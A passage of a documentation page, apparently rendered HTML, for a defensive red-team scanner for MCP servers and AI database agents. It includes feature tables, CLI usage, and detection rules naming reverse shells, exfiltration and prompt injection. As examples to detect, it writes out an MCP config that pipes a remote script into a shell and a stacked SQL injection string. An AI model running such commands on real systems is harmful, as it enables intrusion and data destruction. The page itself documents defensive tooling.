+  
+    Reference
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Reference
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="reference/auxiliary_and_benchmarks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Auxiliary & Benchmark Appendix (Tier 3/4)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="roadmap/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Roadmap & Changelog
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_9" id="__nav_9_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Roadmap & Changelog
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="changelog/tasks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Task Changelog (TASK-01–94)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#why-teams-adopt-verity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why teams adopt Verity
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tier-1-must-have-product-core" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tier 1 — Must-Have Product Core
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tier-2-high-customer-need" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tier 2 — High Customer Need
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#verity-pro" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verity Pro
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#customer-pain-points-problem-to-solution-playbook" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Customer Pain Points &amp; Problem-to-Solution Playbook
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Customer Pain Points &amp; Problem-to-Solution Playbook">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-shadow-mcp-servers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Shadow MCP Servers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-hardcoded-api-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Hardcoded API Keys
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-sql-injection-bola-in-ai-db-agents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. SQL Injection &amp; BOLA in AI DB Agents
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-missing-cicd-security-gates" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Missing CI/CD Security Gates
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#feature-matrix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Feature Matrix
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Feature Matrix">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ide-client-coverage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IDE client coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#static-rules-13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Static rules (13)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ast-rules-9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AST rules (9)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlsecurityguard-dialects-7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SqlSecurityGuard dialects (7)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zero-docker-vulnerable-targets-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zero-Docker vulnerable targets (4)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verity-serve-mcp-tools-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        verity serve MCP tools (4)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#agent-native-mcp-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Agent-Native MCP Server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#output-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Output formats
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#zero-docker-demo-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zero-Docker demo targets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Architecture
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#end-to-end-walkthroughs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        End-to-end walkthroughs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="End-to-end walkthroughs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#walkthrough-1-sqlite-basic-target-with-verity-test-demo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough 1: SQLite Basic Target with verity test --demo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#walkthrough-2-postgresql-multi-tenant-target-with-verity-test-demo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough 2: PostgreSQL Multi-Tenant Target with verity test --demo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#walkthrough-3-mcp-code-execution-target-with-verity-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough 3: MCP Code Execution Target with verity scan
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#next-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Next steps
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+    <a href="https://github.com/JMartynov/verityredteam-free/edit/main/docs/index.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/JMartynov/verityredteam-free/raw/main/docs/index.md" title="View source of this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="verity-red-team">Verity Red Team<a class="headerlink" href="#verity-red-team" title="Permanent link">&para;</a></h1>
+<p><strong>Find the exploitable path before an attacker does.</strong> Verity is a zero-Docker, MCP-native red-team toolkit for MCP servers, AI database agents, and the IDE clients that connect them. It combines static configuration analysis, AST-aware source review, dialect-specific SQL validation, live exploit verification, and an MCP server that lets assistants invoke security tooling directly.</p>
+<p><a href="getting-started/installation/">Quick start</a> · <a href="#feature-matrix">Feature matrix</a> · <a href="#architecture">Architecture</a> · <a href="#end-to-end-walkthroughs">Walkthroughs</a></p>
+<hr />
+<h2 id="why-teams-adopt-verity">Why teams adopt Verity<a class="headerlink" href="#why-teams-adopt-verity" title="Permanent link">&para;</a></h2>
+<p>AI agents now hold credentials, execute shell commands, query production databases, and discover tools dynamically. Traditional SAST tools do not understand MCP transport semantics, tool permission scopes, or the difference between a safe parameterized query and an agent-generated SQL string. Verity closes that gap with checks designed for the AI-native stack and with proof-of-exploit verification that runs locally, without Docker, cloud accounts, or production access.</p>
+<ul>
+<li><strong>Zero-Docker by default.</strong> Four intentionally vulnerable targets run in-process for safe demos and CI.</li>
+<li><strong>MCP-native.</strong> Scan MCP client configs, server manifests, tool schemas, and transport settings.</li>
+<li><strong>Database-aware.</strong> Validate SQL across seven dialects and detect BOLA/IDOR patterns in AI database agents.</li>
+<li><strong>CI-ready.</strong> Deterministic exit codes, JSON/SARIF output, and policy gates for pull requests.</li>
+<li><strong>Assistant-integrated.</strong> <code>verity serve</code> exposes scanning, guarding, oracle, and remediation tools over MCP.</li>
+</ul>
+<hr />
+<h2 id="tier-1-must-have-product-core">Tier 1 — Must-Have Product Core<a class="headerlink" href="#tier-1-must-have-product-core" title="Permanent link">&para;</a></h2>
+<p>The twelve capabilities below are what a team installs Verity for. Everything is
+available in the Apache-2.0 Free edition unless the row carries the <code>[Pro]</code> badge.</p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Edition</th>
+<th>Value Proposition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Deterministic Multi-Dialect SQL AST Guard (<code>SqlSecurityGuard</code>)</td>
+<td>Free</td>
+<td>Parses model-generated SQL across seven dialects and rejects interpolation, statement stacking, and unbounded reads before execution.</td>
+</tr>
+<tr>
+<td>Multi-Client AI Workstation Config Discovery (<code>verity scan</code>)</td>
+<td>Free</td>
+<td>Locates every configured MCP server across Claude Desktop, Cursor, Windsurf, VS Code, Cline, Continue, and Zed.</td>
+</tr>
+<tr>
+<td>Plaintext Secret &amp; DSN Credential Scanner / Redactor</td>
+<td>Free</td>
+<td>Detects provider tokens and embedded DSNs in MCP environment blocks and reports them with redacted evidence only.</td>
+</tr>
+<tr>
+<td>Unknown Capability Profiler (UCP) &amp; SHA-256 Rug-Pull Detector</td>
+<td>Free</td>
+<td>Baselines each server's advertised capability set and flags silent tool-surface changes between scans.</td>
+</tr>
+<tr>
+<td>Pre-Flight Static Metadata &amp; Tool-Poisoning Screener (13 Rules)</td>
+<td>Free</td>
+<td>Screens tool names, descriptions, and schema defaults for injection, poisoning, and exfiltration payloads.</td>
+</tr>
+<tr>
+<td>NoSQL / MongoDB AST Filter &amp; Tenant Guard (<code>FilterSecurityGuard</code>)</td>
+<td>[Pro]</td>
+<td>Parses Mongo filter documents, rejects operator injection, and binds results to the authenticated tenant.</td>
+</tr>
+<tr>
+<td>Multi-Source OSV v1.6.0 Ingestion &amp; DSU Alias Graph</td>
+<td>Free</td>
+<td>Correlates GHSA, PyPA, RustSec, and ecosystem aliases into one advisory graph per package.</td>
+</tr>
+<tr>
+<td>Tri-Layer Structural Fingerprint Matcher &amp; O(1) Index (6k+ Passports)</td>
+<td>Free</td>
+<td>Identifies which MCP server a schema came from, even when the server name has been spoofed.</td>
+</tr>
+<tr>
+<td>Pure-Stdlib Agent Security MCP Server (<code>verity serve</code>)</td>
+<td>Free</td>
+<td>Exposes scanning, guarding, oracle, and remediation tooling to assistants with no extra runtime dependency.</td>
+</tr>
+<tr>
+<td>SemVer Vulnerability Lookup &amp; SQLite Cache Engine</td>
+<td>Free</td>
+<td>Resolves the vulnerable range for an exact installed version and caches results for offline CI runs.</td>
+</tr>
+<tr>
+<td>Response Volume Policy &amp; Payload Truncation Guard (<code>VolumePolicyGuard</code>)</td>
+<td>[Pro]</td>
+<td>Caps row counts and payload bytes at runtime, then emits a tamper-evident evidence hash.</td>
+</tr>
+<tr>
+<td>Supply-Chain Tamper &amp; Drift Detector (<code>detect-drift</code>)</td>
+<td>Free</td>
+<td>Compares pinned manifests against observed server behaviour and fails on unexplained drift.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="tier-2-high-customer-need">Tier 2 — High Customer Need<a class="headerlink" href="#tier-2-high-customer-need" title="Permanent link">&para;</a></h2>
+<p>These thirteen capabilities are requested by teams that already run Tier 1 in
+CI. They deepen coverage without changing the install story.</p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Edition</th>
+<th>Value Proposition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OASIS SARIF v2.1.0 Enterprise Compliance Exporter</td>
+<td>[Pro]</td>
+<td>Emits SARIF 2.1.0 for code-scanning dashboards plus multi-framework compliance bundles.</td>
+</tr>
+<tr>
+<td>Snowflake Cloud Warehouse Guard (<code>SnowflakeSecurityGuard</code>)</td>
+<td>[Pro]</td>
+<td>Enforces role, stage, and time-travel boundaries on warehouse queries before execution.</td>
+</tr>
+<tr>
+<td>Zero-Docker In-Memory Demo Targets (<code>verity test --demo</code>)</td>
+<td>Free</td>
+<td>Reproduces SQL injection, BOLA, NoSQL injection, and unsafe execution in-process for safe CI demos.</td>
+</tr>
+<tr>
+<td>Remote Snapshot Fetcher (ETag) &amp; Air-Gap Fallback</td>
+<td>Free</td>
+<td>Keeps fingerprint and advisory snapshots current without breaking air-gapped installations.</td>
+</tr>
+<tr>
+<td>Client Config Hardening &amp; Lossless JSONC Exporter (<code>export-config</code>)</td>
+<td>Free</td>
+<td>Rewrites risky client configs while preserving comments and key order.</td>
+</tr>
+<tr>
+<td>Bidirectional JSON-RPC Stdio Security Proxy (<code>McpStdioProxy</code>)</td>
+<td>Free</td>
+<td>Enforces policy on tool calls in flight between an IDE client and an untrusted server.</td>
+</tr>
+<tr>
+<td>Global npm/npx Unconfigured Server Discovery (<code>--scan-global</code>)</td>
+<td>Free</td>
+<td>Finds MCP packages installed on the workstation but never registered with any client.</td>
+</tr>
+<tr>
+<td>Python MCP Source AST Scanner (<code>McpAstScannerEngine</code> - 9 Rules)</td>
+<td>Free</td>
+<td>Traverses handler source with alias-aware import resolution (<code>self.imports</code>) and def-use analysis for <code>CWE-22</code>, <code>CWE-89</code>, and <code>CWE-862</code> alongside eval, shell, deserialization, and XSS sinks.</td>
+</tr>
+<tr>
+<td>Polyglot Static AST Extractors (10 Languages)</td>
+<td>Free</td>
+<td>Extracts tool definitions from non-Python MCP servers so fingerprinting works across runtimes.</td>
+</tr>
+<tr>
+<td>Multi-Server Tool Collision &amp; Shadowing Detector (<code>ConflictDetector</code>)</td>
+<td>Free</td>
+<td>Flags two servers advertising the same tool name with different behaviour.</td>
+</tr>
+<tr>
+<td>Live Network TCP/HTTP/SSE MCP Listener Scanner (<code>network-scan</code>)</td>
+<td>Free</td>
+<td>Discovers unadvertised MCP endpoints listening on the local network.</td>
+</tr>
+<tr>
+<td>AST Taint &amp; YARA Threat Engine (<code>McpSourceScanner</code>, <code>ThreatEngine</code>)</td>
+<td>Free</td>
+<td>Follows tainted values from tool input to dangerous sinks and matches YARA threat rules.</td>
+</tr>
+<tr>
+<td>AST Call-Graph Dependency Reachability (<code>audit-transitive</code>)</td>
+<td>Free</td>
+<td>Proves whether a vulnerable helper is actually reachable from an exposed tool.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="verity-pro">Verity Pro<a class="headerlink" href="#verity-pro" title="Permanent link">&para;</a></h2>
+<div class="admonition note">
+<p class="admonition-title">Commercial capabilities live in the Pro guide</p>
+<p>Cloud warehouse and NoSQL guards, OASIS SARIF v2.1.0 compliance export, the extended
+<code>verity_remediation_ops</code> action set, and multi-turn Socratic red-teaming are documented —
+together with the graceful degradation contract — in
+<a href="pro/enterprise_features/">Verity Pro Enterprise Features</a>.</p>
+</div>
+<p>Everything outside the two tiers above — the optional Tier 3 utilities and the
+internal Tier 4 QA and regression harnesses — is catalogued in the
+<a href="reference/auxiliary_and_benchmarks/">Auxiliary &amp; Benchmark Appendix (Tier 3/4)</a>.</p>
+<hr />
+<h2 id="customer-pain-points-problem-to-solution-playbook">Customer Pain Points &amp; Problem-to-Solution Playbook<a class="headerlink" href="#customer-pain-points-problem-to-solution-playbook" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Pain point</th>
+<th>What it looks like in practice</th>
+<th>Verity play</th>
+<th>Evidence produced</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shadow MCP servers</td>
+<td>Unreviewed local servers launched by an IDE with shell access and broad tool scopes</td>
+<td>Discover configs, enumerate servers/tools, flag dangerous stdio commands and wildcard permissions</td>
+<td>Config findings + tool inventory</td>
+</tr>
+<tr>
+<td>Hardcoded API keys</td>
+<td>Secrets embedded in MCP <code>env</code>, client configs, or agent source</td>
+<td>Static secret detection plus AST credential checks, with redacted evidence</td>
+<td>Rule IDs, file/line, redacted value</td>
+</tr>
+<tr>
+<td>SQL injection &amp; BOLA in AI DB agents</td>
+<td>LLM-constructed SQL or tenant IDs accepted without authorization checks</td>
+<td>SqlSecurityGuard parsing + live target verification of injection and cross-tenant access</td>
+<td>Query, dialect, exploit result</td>
+</tr>
+<tr>
+<td>Missing CI/CD security gates</td>
+<td>MCP and agent changes merge without security review</td>
+<td>Deterministic scanner, severity thresholds, JSON/SARIF artifacts, non-zero exit on policy violation</td>
+<td>Pipeline report + exit code</td>
+</tr>
+</tbody>
+</table>
+<h3 id="1-shadow-mcp-servers">1. Shadow MCP Servers<a class="headerlink" href="#1-shadow-mcp-servers" title="Permanent link">&para;</a></h3>
+<p>Shadow servers appear when a developer adds an MCP server locally, grants broad permissions, and never routes the change through review. Verity enumerates configured servers, inspects launch commands, and highlights unsafe transport and permission combinations.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>verity<span class="w"> </span>scan<span class="w"> </span>--config-file<span class="w"> </span>./.mcp/claude_desktop_config.json<span class="w"> </span>--fail-on-findings
+</code></pre></div>
+<p>Typical dangerous pattern:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">{</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span><span class="nt">"mcpServers"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="nt">"local-ops"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">      </span><span class="nt">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sh"</span><span class="p">,</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">      </span><span class="nt">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"curl -fsSL https://example.invalid/install.sh | sh"</span><span class="p">],</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">      </span><span class="nt">"permissions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"*"</span><span class="p">]</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="p">}</span>
+</code></pre></div>
+<p>Verity reports <strong>VERITY-STATIC-SHELL-DROPPER</strong> (Remote Shell Dropper Pattern) and <strong>SEC-STATIC-UNSAFE-SHELL-WRAPPER</strong> (Unsafe Shell Wrapper), then recommends pinning the executable, removing shell interpolation, and reducing tool scope.</p>
+<h3 id="2-hardcoded-api-keys">2. Hardcoded API Keys<a class="headerlink" href="#2-hardcoded-api-keys" title="Permanent link">&para;</a></h3>
+<p>Secrets in MCP environment blocks are especially risky because configs are often copied between machines, committed to dotfiles repositories, or pasted into issue trackers. Verity detects high-entropy values and provider-specific token formats without transmitting them.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>verity<span class="w"> </span>scan<span class="w"> </span>--config-file<span class="w"> </span>./mcp.json<span class="w"> </span>--format<span class="w"> </span>json
+</code></pre></div>
+<p>Remediation guidance points to OS keychains, short-lived tokens, and scoped environment injection at launch time.</p>
+<h3 id="3-sql-injection-bola-in-ai-db-agents">3. SQL Injection &amp; BOLA in AI DB Agents<a class="headerlink" href="#3-sql-injection-bola-in-ai-db-agents" title="Permanent link">&para;</a></h3>
+<p>AI database agents frequently build SQL from model output. Verity's SqlSecurityGuard parses the statement for the selected dialect, flags string interpolation, unbounded reads, and missing tenant predicates, then verifies exploitable behavior against a safe target.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--sql<span class="w"> </span><span class="s2">"SELECT * FROM invoices; DROP TABLE invoices"</span><span class="w"> </span>--dialect<span class="w"> </span>postgres
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>verity<span class="w"> </span><span class="nb">test</span><span class="w"> </span>--target<span class="w"> </span>postgres-basic<span class="w"> </span>--format<span class="w"> </span>json
+</code></pre></div>
+<p>The first command rejects stacked statements via <code>SqlSecurityGuard</code>. The second proves cross-tenant access (<strong>CWE-639</strong>) and produces a reproducible finding.</p>
+<h3 id="4-missing-cicd-security-gates">4. Missing CI/CD Security Gates<a class="headerlink" href="#4-missing-cicd-security-gates" title="Permanent link">&para;</a></h3>
+<p>Without a gate, MCP configuration and agent code changes merge unreviewed. Add Verity to the pipeline with a severity threshold and publish JSON/SARIF for code scanning dashboards.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>verity<span class="w"> </span>scan<span class="w"> </span>--path<span class="w"> </span>.<span class="w"> </span>--format<span class="w"> </span>json<span class="w"> </span>--output<span class="w"> </span>verity.json<span class="w"> </span>--fail-on-findings
+</code></pre></div>
+<p>A non-zero exit fails the job when medium-or-higher findings exist, while SARIF preserves rule metadata for triage.</p>
+<hr />
+<h2 id="feature-matrix">Feature Matrix<a class="headerlink" href="#feature-matrix" title="Permanent link">&para;</a></h2>
+<h3 id="ide-client-coverage">IDE client coverage<a class="headerlink" href="#ide-client-coverage" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Client</th>
+<th>Discovery</th>
+<th>Config scan</th>
+<th>Live test</th>
+<th><code>verity serve</code></th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Claude Desktop</td>
+<td>Native MCP config</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Primary local assistant target</td>
+</tr>
+<tr>
+<td>Cursor</td>
+<td>Native MCP config</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Supports project and user configs</td>
+</tr>
+<tr>
+<td>Windsurf</td>
+<td><code>mcp_config.json</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Codeium-managed config</td>
+</tr>
+<tr>
+<td>VS Code</td>
+<td>User/workspace MCP config</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Workspace overrides user config</td>
+</tr>
+<tr>
+<td>Cline</td>
+<td><code>cline_mcp_settings.json</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>VS Code extension storage</td>
+</tr>
+<tr>
+<td>Continue</td>
+<td><code>~/.continue/config.json</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td><code>mcpServers</code> block</td>
+</tr>
+<tr>
+<td>Zed</td>
+<td><code>settings.json</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td><code>context_servers</code> block</td>
+</tr>
+</tbody>
+</table>
+<h3 id="static-rules-13">Static rules (13)<a class="headerlink" href="#static-rules-13" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Rule</th>
+<th>Name</th>
+<th>Detects</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>VERITY-STATIC-INJECTION-OVERRIDE</td>
+<td>Prompt Injection Instruction Override</td>
+<td>Instruction overrides and jailbreak directives embedded in tool or prompt text</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-INJECTION-DELIMITER</td>
+<td>Simulated Delimiter / Hidden Evasion Block</td>
+<td>Fake role tags, chat-template markers, and hidden instruction blocks</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-TOOL-POISONING</td>
+<td>Tool Poisoning / Secondary Shadow Functionality</td>
+<td>Unadvertised secondary actions such as credential scraping during processing</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-EXFIL-WEBHOOK</td>
+<td>Out-of-Band Data Exfiltration Endpoint</td>
+<td>Disposable webhook, request-bin, and OAST collector endpoints</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-EXFIL-COVERT</td>
+<td>Covert Data Transfer / Streaming Exfiltration</td>
+<td>Clipboard or conversation streaming to remote hosts and do-not-notify directives</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-METADATA-SSRF</td>
+<td>Cloud Instance Metadata Service SSRF</td>
+<td>Link-local metadata endpoints that expose cloud IAM credentials</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-CREDENTIAL-HARVESTING</td>
+<td>Sensitive Credential Value or Key Block</td>
+<td>Embedded keys, assigned API credentials, and sensitive path references</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-SHELL-DROPPER</td>
+<td>Remote Shell Dropper Pattern</td>
+<td>Remote downloads piped straight into a shell interpreter</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-SHELL-REVERSE-PIPE</td>
+<td>Reverse Shell Network Payload</td>
+<td>Reverse shell socket and named-pipe payloads</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-CODE-EXECUTION</td>
+<td>Obfuscated / Dynamic Execution Wrapper</td>
+<td>Base64 and encoded command execution wrappers</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-SHELL-DESTRUCTIVE</td>
+<td>Destructive Host Command</td>
+<td>Disk-wiping and filesystem-destroying commands</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-SQL-INJECTION-SCHEMA</td>
+<td>SQL Injection Sequence in Schema Defaults</td>
+<td>SQL breakout sequences in schema default values</td>
+</tr>
+<tr>
+<td>VERITY-STATIC-SCRIPT-INJECTION-XSS</td>
+<td>Script Injection / Stored XSS in Metadata</td>
+<td>Unescaped script tags and javascript pseudo-protocols in metadata</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ast-rules-9">AST rules (9)<a class="headerlink" href="#ast-rules-9" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Rule</th>
+<th>Name</th>
+<th>Detects</th>
+</tr>
+</thead>
